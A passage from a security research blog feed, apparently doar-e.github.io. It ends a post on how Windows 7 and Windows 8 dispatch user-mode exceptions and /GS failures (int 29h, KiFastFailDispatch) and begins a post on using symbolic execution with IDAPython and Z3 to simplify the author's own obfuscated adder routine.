</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">decodedInstructionsCount</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="n">fprintf</span><span class="p">(</span>
</span><span class='line'>        <span class="n">f</span><span class="p">,</span>
</span><span class='line'>        <span class="s">&quot;%.8I64x (%.2d) %-24s %s%s%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="n">decodedInstructions</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">offset</span><span class="p">,</span>
</span><span class='line'>        <span class="n">decodedInstructions</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">size</span><span class="p">,</span>
</span><span class='line'>        <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">decodedInstructions</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">instructionHex</span><span class="p">.</span><span class="n">p</span><span class="p">,</span>
</span><span class='line'>        <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">decodedInstructions</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">mnemonic</span><span class="p">.</span><span class="n">p</span><span class="p">,</span>
</span><span class='line'>        <span class="n">decodedInstructions</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">operands</span><span class="p">.</span><span class="n">length</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">?</span> <span class="s">&quot; &quot;</span> <span class="o">:</span> <span class="s">&quot;&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">decodedInstructions</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">operands</span><span class="p">.</span><span class="n">p</span>
</span><span class='line'>      <span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>So the prototype works pretty great like that.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>D:\Codes\The Sentinel\Release&gt;ProcessSpawner.exe &quot;D:\Codes\The Sentinel\Release\ExceptionMonitorDll.dll&quot; ..\tests\divzero.exe divzero.exe
</span><span class='line'>D:\Codes\The Sentinel\Release&gt;ls -l D:\Crashs\divzero.exe
</span><span class='line'>total 4
</span><span class='line'>-rw-rw-rw-  1 0vercl0k 0 863 2013-10-16 22:58 exceptionaddress_401359pid_2732tick_258597468timestamp_1381957116.txt
</span></code></pre></td></tr></table></div></figure>


<p>But once I&rsquo;ve encountered a behavior that I didn&rsquo;t plan on: there was like a stack-corruption in a stack-frame protected by the <em>/GS</em> cookie. If the cookie has been, somehow, rewritten the program calls <em>___report_gs_failure</em> (sometimes the implementation is directly inlined, thus you can find the definition of the function in your binary) in order to kill the program because the stack-frame is broken. Long story short, I was also hooking <em>kernel32!UnhandleExceptionFilter</em> to not miss that kind of exceptions, but I noticed while writing this post that it doesn&rsquo;t work anymore. We are going to see why in the next part.</p>

<h1>The untold story: Win8 and <em>nt!KiFastFailDispatch</em></h1>

<h2>Introduction</h2>

<p>When I was writing this little post I did also some tests on my personal machine: a Windows 8 host. But the test for the <em>/GS</em> thing we just talked about wasn&rsquo;t working at all as I said. So I started my investigation by looking at the code of <em>__report_gsfailure</em> (generated with a VS2012) and I saw this:</p>

<figure class='code'><figcaption><span>__report_gsfailure</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="n">__usercall</span> <span class="nf">__report_gsfailure</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a1</span><span class="o">&lt;</span><span class="n">ebx</span><span class="o">&gt;</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a2</span><span class="o">&lt;</span><span class="n">edi</span><span class="o">&gt;</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a3</span><span class="o">&lt;</span><span class="n">esi</span><span class="o">&gt;</span><span class="p">,</span> <span class="kt">char</span> <span class="n">a4</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// eax@1</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// edx@1</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// ecx@1</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [sp-4h] [bp-328h]@1</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [sp+324h] [bp+0h]@0</span>
</span><span class='line'>  <span class="kt">void</span> <span class="o">*</span><span class="n">v13</span><span class="p">;</span> <span class="c1">// [sp+328h] [bp+4h]@3</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">v4</span> <span class="o">=</span> <span class="n">IsProcessorFeaturePresent</span><span class="p">(</span><span class="mh">0x17u</span><span class="p">);</span>
</span><span class='line'>  <span class="c1">// [...]</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">v6</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'>    <span class="kr">__asm</span> <span class="p">{</span> <span class="kt">int</span>     <span class="mi">29</span><span class="n">h</span>             <span class="p">;</span> <span class="n">DOS</span> <span class="mi">2</span><span class="o">+</span> <span class="n">internal</span> <span class="o">-</span> <span class="n">FAST</span> <span class="n">PUTCHAR</span> <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="p">[...]</span>
</span><span class='line'>  <span class="n">__raise_securityfailure</span><span class="p">(</span><span class="o">&amp;</span><span class="n">GS_ExceptionPointers</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first thing I asked myself was about that weird <em>int 29h</em>. Next thing I did was to download a fresh Windows 8 VM <a href="http://www.modern.ie/fr-fr/virtualization-tools#downloads">here</a> and attached a kernel debugger in order to check the IDT entry 0x29:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; vertarget
</span><span class='line'>Windows 8 Kernel Version 9200 MP (2 procs) Free x86 compatible
</span><span class='line'>Built by: 9200.16424.x86fre.win8_gdr.120926-1855
</span><span class='line'>Machine Name:
</span><span class='line'>Kernel base = 0x8145c000 PsLoadedModuleList = 0x81647e68
</span><span class='line'>Debug session time: Thu Oct 17 11:30:18.772 2013 (UTC + 2:00)
</span><span class='line'>System Uptime: 0 days 0:02:55.784
</span><span class='line'>kd&gt; !idt 29
</span><span class='line'>
</span><span class='line'>Dumping IDT: 809da400
</span><span class='line'>
</span><span class='line'>29: 8158795c nt!KiRaiseSecurityCheckFailure
</span></code></pre></td></tr></table></div></figure>


<p>As opposed I was used to see on my Win7 machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; vertarget
</span><span class='line'>Windows 7 Kernel Version 7600 MP (1 procs) Free x86 compatible
</span><span class='line'>Product: WinNt, suite: TerminalServer SingleUserTS
</span><span class='line'>Built by: 7600.16385.x86fre.win7_rtm.090713-1255
</span><span class='line'>Machine Name:
</span><span class='line'>Kernel base = 0x84646000 PsLoadedModuleList = 0x8478e810
</span><span class='line'>Debug session time: Thu Oct 17 14:25:40.969 2013 (UTC + 2:00)
</span><span class='line'>System Uptime: 0 days 0:00:55.203
</span><span class='line'>kd&gt; !idt 29
</span><span class='line'>
</span><span class='line'>Dumping IDT: 80b95400
</span><span class='line'>
</span><span class='line'>29: 00000000
</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve opened my favorite IDE and I wrote a bit of code to test if there was a different behavior between Win7 and Win8 regarding this exception handling:</p>

<figure class='code'><figcaption><span>gs.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;windows.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kr">__try</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="kr">__asm</span> <span class="kt">int</span> <span class="mh">0x29</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="kr">__except</span><span class="p">(</span><span class="n">EXCEPTION_EXECUTE_HANDLER</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;SEH catched the exception!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>On Win7 I&rsquo;m able to catch the exception via a SEH handler: it means the Windows kernel calls the user mode exception dispatcher for further processing by the user exception handlers (as we saw at the beginning of the post). But on Win8, at my surprise, I don&rsquo;t get the message ; the process is killed directly after displaying the usual message box &ldquo;a program has stopped&rdquo;. Definitely weird.</p>

<h2>What happens on Win7</h2>

<p>When the interruption 0x29 is triggered by my code, the CPU is going to check if there is an IDT entry for that interruption, and if there isn&rsquo;t it&rsquo;s going to raise a #GP (<em>nt!KiTrap0d</em>) that will end up in <em>nt!KiDispatchException</em>.</p>

<p>And as previously, the function is going to check where the fault happened and because it happened in userland it will modify the trap frame structure to reach <em>ntdll!KiUserExceptionDispatcher</em>. That&rsquo;s why we can catch it in our <em>__except</em> scope.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; r
</span><span class='line'>eax=0000000d ebx=86236d40 ecx=862b48f0 edx=0050e600 esi=00000000 edi=0029b39f
</span><span class='line'>eip=848652dd esp=9637fd34 ebp=9637fd34 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
</span><span class='line'>nt!KiTrap0D+0x471:
</span><span class='line'>848652dd e80ddeffff      call    nt!CommonDispatchException+0x123 (848630ef)
</span><span class='line'>kd&gt; k 2
</span><span class='line'>ChildEBP RetAddr
</span><span class='line'>9637fd34 0029b39f nt!KiTrap0D+0x471
</span><span class='line'>0016fc1c 0029be4c gs+0x2b39f
</span><span class='line'>kd&gt; u gs+0x2b39f l1
</span><span class='line'>gs+0x2b39f:
</span><span class='line'>0029b39f cd29            int     29h
</span></code></pre></td></tr></table></div></figure>


<h2>What happens on Win8</h2>

<p>This time the kernel has defined an ISR for the interruption 0x29: <em>nt!KiRaiseSecurityCheckFailure</em>. This function is going to call <em>nt!KiFastFailDispatch</em>, and this one is going to call <em>nt!KiDispatchException</em>:</p>

<p><img class="center" src="http://doar-e.github.io/images/ntdll.KiUserExceptionDispatcher/kifastfaildispatch.png"></p>

<p>BUT the exception is going to be processed as a <strong>second-chance</strong> exception because of the way <em>nt!KiFastFailDispatch</em> calls the kernel mode exception dispatcher. And if we look at the source of <em>nt!KiDispatchException</em> in ReactOS we can see that this exception won&rsquo;t have the chance to reach back the userland as in Win7 :)):</p>

<figure class='code'><figcaption><span>KiDispatchException from ReactOS</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">VOID</span>
</span><span class='line'><span class="n">NTAPI</span>
</span><span class='line'><span class="nf">KiDispatchException</span><span class="p">(</span><span class="n">IN</span> <span class="n">PEXCEPTION_RECORD</span> <span class="n">ExceptionRecord</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">IN</span> <span class="n">PKEXCEPTION_FRAME</span> <span class="n">ExceptionFrame</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">IN</span> <span class="n">PKTRAP_FRAME</span> <span class="n">TrapFrame</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">IN</span> <span class="n">KPROCESSOR_MODE</span> <span class="n">PreviousMode</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">IN</span> <span class="n">BOOLEAN</span> <span class="n">FirstChance</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">CONTEXT</span> <span class="n">Context</span><span class="p">;</span>
</span><span class='line'>    <span class="n">EXCEPTION_RECORD</span> <span class="n">LocalExceptRecord</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// [...]</span>
</span><span class='line'>    <span class="cm">/* Handle kernel-mode first, it&#39;s simpler */</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">PreviousMode</span> <span class="o">==</span> <span class="n">KernelMode</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'><span class="c1">// [...]</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="cm">/* User mode exception, was it first-chance? */</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">FirstChance</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'><span class="c1">// [...]</span>
</span><span class='line'><span class="c1">// that&#39;s in this branch the kernel reaches back to the user mode exception dispatcher</span>
</span><span class='line'><span class="c1">// but if FirstChance=0, we won&#39;t have that chance</span>
</span><span class='line'>
</span><span class='line'>          <span class="cm">/* Set EIP to the User-mode Dispatcher */</span>
</span><span class='line'>          <span class="n">TrapFrame</span><span class="o">-&gt;</span><span class="n">Eip</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">KeUserExceptionDispatcher</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>          <span class="cm">/* Dispatch exception to user-mode */</span>
</span><span class='line'>          <span class="n">_SEH2_YIELD</span><span class="p">(</span><span class="k">return</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="cm">/* Try second chance */</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">DbgkForwardException</span><span class="p">(</span><span class="n">ExceptionRecord</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">))</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="cm">/* Handled, get out */</span>
</span><span class='line'>            <span class="k">return</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">DbgkForwardException</span><span class="p">(</span><span class="n">ExceptionRecord</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">))</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="cm">/* Handled, get out */</span>
</span><span class='line'>            <span class="k">return</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="c1">// [...]</span>
</span><span class='line'>    <span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>To convince yourself you can even modify the <em>FirstChance</em> argument passed to <em>nt!KiDispatchException</em> from <em>nt!KiFastFailDispatch</em>. You will see the SEH handler is called like in Win7:</p>

<p><img class="center" src="http://doar-e.github.io/images/ntdll.KiUserExceptionDispatcher/win8.png"></p>

<p>Cool, we have now our answer to the weird behavior! I guess if you want to monitor <em>/GS</em> exception you are going to find another trick :)).</p>

<h1>Conclusion</h1>

<p>I hope you enjoyed this little trip in the Windows&#8217; exception world both in user and kernel mode. You will find the seems-to-be-working PoC on my github account here: <a href="https://github.com/0vercl0k/stuffz/tree/master/The%20Sentinel">The sentinel</a>. By the way, you are highly encouraged to improve it, or to modify it in order to suit your use-case!</p>

<p>If you liked the subject of the post, I&rsquo;ve made a list of really cool/interesting links you should check out:</p>

<ul>
<li><a href="http://www.alex-ionescu.com/?p=69">New Security Assertions in Windows 8</a> &ndash; <a href="https://twitter.com/aionescu">@aionescu</a> endless source of inspiration</li>
<li><a href="http://www.uninformed.org/?v=4&amp;a=5&amp;t=txt">Exploiting the Otherwise Unexploitable on Windows</a> &ndash; Yet another awesome article by <a href="http://www.nynaeve.net/">Skywing</a> and <a href="http://uninformed.org/">skape</a></li>
<li><a href="http://www.nynaeve.net/?p=201">A catalog of NTDLL kernel mode to user mode callbacks, part 2: KiUserExceptionDispatcher</a></li>
<li><a href="http://dralu.com/?p=167">Windows Exceptions, Part II: Exception Dispatching</a></li>
<li><a href="https://easyhook.codeplex.com/">EasyHook</a> &ndash; &ldquo;EasyHook starts where Microsoft Detours ends.&rdquo;</li>
</ul>


<p>High five to my friend <a href="https://twitter.com/Ivanlef0u">@Ivanlef0u</a> for helping me to troubleshoot the weird behavior, and <a href="https://twitter.com/__x86">@__x86</a> for the review!</p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Breaking Kryptonite's obfuscation: a static analysis approach relying on symbolic execution]]></title>
    <link href="http://doar-e.github.io/blog/2013/09/16/breaking-kryptonites-obfuscation-with-symbolic-execution/"/>
    
    <updated>2013-09-16T11:47:00+01:00</updated>
    <id>http://doar-e.github.io/blog/2013/09/16/breaking-kryptonites-obfuscation-with-symbolic-execution</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p><em>Kryptonite</em> was a proof-of-concept I built to obfuscate codes at the LLVM intermediate representation level. The idea was to use semantic-preserving transformations in order to not break the original program. One of the main idea was for example to build a home-made 32 bits adder to replace the <em>add</em> LLVM instruction. Instead of having a single asm instruction generated at the end of the pipeline, you will end up with a ton of assembly codes doing only an addition. If you never read my article, and you are interested in it here it is: <a href="http://0vercl0k.tuxfamily.org/bl0g/?p=260">Obfuscation of steel: meet my Kryptonite</a>.</p>

<p><img class="center" src="http://doar-e.github.io/images/breaking_kryptonite_s_obfuscation_with_symbolic_execution/home-made-adder.png"></p>

<p>In this post I wanted to show you how we can manage to break that obfuscation with symbolic execution. We are going to write a really tiny symbolic execution engine with IDAPy, and we will use Z3Py to simplify all our equations. Note that a friend of mine <a href="https://twitter.com/elvanderb">@elvanderb</a> used a similar approach (more generic though) to simplify some parts of the <a href="http://download.tuxfamily.org/overclokblog/Obfuscation%20of%20steel%3a%20meet%20my%20Kryptonite/binaries/">crackme</a> ; but he didn&rsquo;t wanted to publish it, so here is my blog post about it!</p>

<!--more-->


<h1>The target</h1>

<p>In this blogpost we are first going to work on the LLVM code emitted by <a href="https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/llvm-cpp-frontend-home-made-32bits-adder.cpp">llvm-cpp-frontend-home-made-32bits-adder.cpp</a>. Long story short, the code uses the LLVM frontend API to emit a home made 32 bits adder in the <a href="http://llvm.org/docs/LangRef.html">LLVM intermediate language</a>. You can then feed the output directly to clang to generate a real executable binary for your platform, I chose to work only on the x86 platform here. I&rsquo;ve also uploaded the binary here: <a href="https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/adder">adder</a>.</p>

<p>So if you open the generated binary in IDA, you will see an interminable routine that only does an addition. At first glance, it really is kind of scary:</p>

<ul>
<li>every instructions seems to be important, there is no junk codes</li>
<li>it seems that only binary operations are used: addition, left shift, right shift, xor, etc.</li>
<li>it&rsquo;s also a two thousands instructions routine</li>
</ul>


<p>The idea in this post is to write a very basic symbolic execution engine in order to see what kind of result will hold the EAX register at the end of the routine. Hopefully, we will obtain something highly simplified and more readable that this bunch of assembly codes!</p>

<h1>The symbolic execution engine approach</h1>

<p>But in fact that piece of code makes it <strong>really</strong> easy for us to write a symbolic execution engine. Here are the main reasons:</p>

<ul>
<li>there is no branches, no loops, perfect.</li>
<li>the instruction aren&rsquo;t playing with the <a href="https://en.wikipedia.org/wiki/FLAGS_register">EFLAGS</a> register.</li>
<li>the instruction only used 32 bits registers (not 16 bits, or 8 bits).</li>
<li>the number of unique instruction is really small: <em>mov</em>, <em>shr</em>, <em>shl</em>, <em>xor</em>, <em>and</em>, <em>xor</em>, <em>add</em>.</li>
<li>the instructions used are easy to emulate.</li>
</ul>


<p>Understand that here, we are really in a specific case, the engine wouldn&rsquo;t be that easy to implement to cover the most used x86 instructions ; but we are lucky, we won&rsquo;t need that!</p>

<p>The engine is in fact a pseudo-emulator that propagates the different actions done by the asm instructions. Here is how our engine works:</p>

<ol>
<li>Each time a symbolic variable is found, you instantiate a Z3 BitVector and you keep it somewhere. A symbolic variable is basically a variable that the attacker can control. For example, in our case, we will have two symbolic variables: the two arguments passed to the function. We will see later an easy heuristic to find &ldquo;automatically&rdquo; the symbolic variables in our case.</li>
<li>When you have an instruction, you emulate it and you update the CPU state of the engine. If it involves an equation, you update your set of equations.</li>
<li>You do that until the end of the routine.</li>
</ol>


<p>Of course, when the engine has been successfully executed, you may want to ask it some questions like &ldquo;what does hold the EAX register at the end of the routine?&rdquo;. You want to have exactly all the operations needed to compute EAX. In our case, we hope to obtain &ldquo;<em>symbolic_variable1</em> + <em>symbolic_variable2</em>&rdquo;.</p>

<p>Here is a little example to sum up what we just said:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nv">arg1</span><span class="p">]</span>  <span class="c1">; at this moment we have our first symbolic variable</span>
</span><span class='line'>                 <span class="c1">; we push it in our equations list</span>
</span><span class='line'><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nv">arg2</span><span class="p">]</span>  <span class="c1">; same thing here</span>
</span><span class='line'>
</span><span class='line'><span class="nf">shr</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">2</span>   <span class="c1">; EAX=sym1 &gt;&gt; 2</span>
</span><span class='line'><span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">1</span>   <span class="c1">; EAX=(sym1 &gt;&gt; 2) + 1</span>
</span><span class='line'><span class="nf">shl</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">3</span>   <span class="c1">; EAX=((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1</span>
</span><span class='line'><span class="nf">and</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">2</span>   <span class="c1">; EAX=(((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2</span>
</span><span class='line'><span class="nf">inc</span> <span class="nb">edx</span>      <span class="c1">; EDX=sym2 + 1</span>
</span><span class='line'><span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span> <span class="c1">; EDX=(sym2 + 1) ^ ((((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2)</span>
</span><span class='line'><span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">edx</span> <span class="c1">; EAX=(sym2 + 1) ^ ((((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So at the end, you can ask the engine to give you the final state of EAX for example and it should give you something like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>EAX=(sym2 + 1) ^ ((((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2)
</span></code></pre></td></tr></table></div></figure>


<p>With that equation you are free to use Z3Py to either simplify it or to try to find how you can have a specific value in EAX controlling only the symbolic variables:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>In [1]: from z3 import *
</span><span class='line'>In [2]: sym1 = BitVec(&#39;sym1&#39;, 32)
</span><span class='line'>In [3]: sym2 = BitVec(&#39;sym2&#39;, 32)
</span><span class='line'>
</span><span class='line'>In [4]: simplify((sym2 + 1) ^ ((((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2))
</span><span class='line'>Out[4]: 1 + sym2 ^ Concat(0, 1 + Extract(0, 0, sym1 &gt;&gt; 2), 0)
</span><span class='line'>
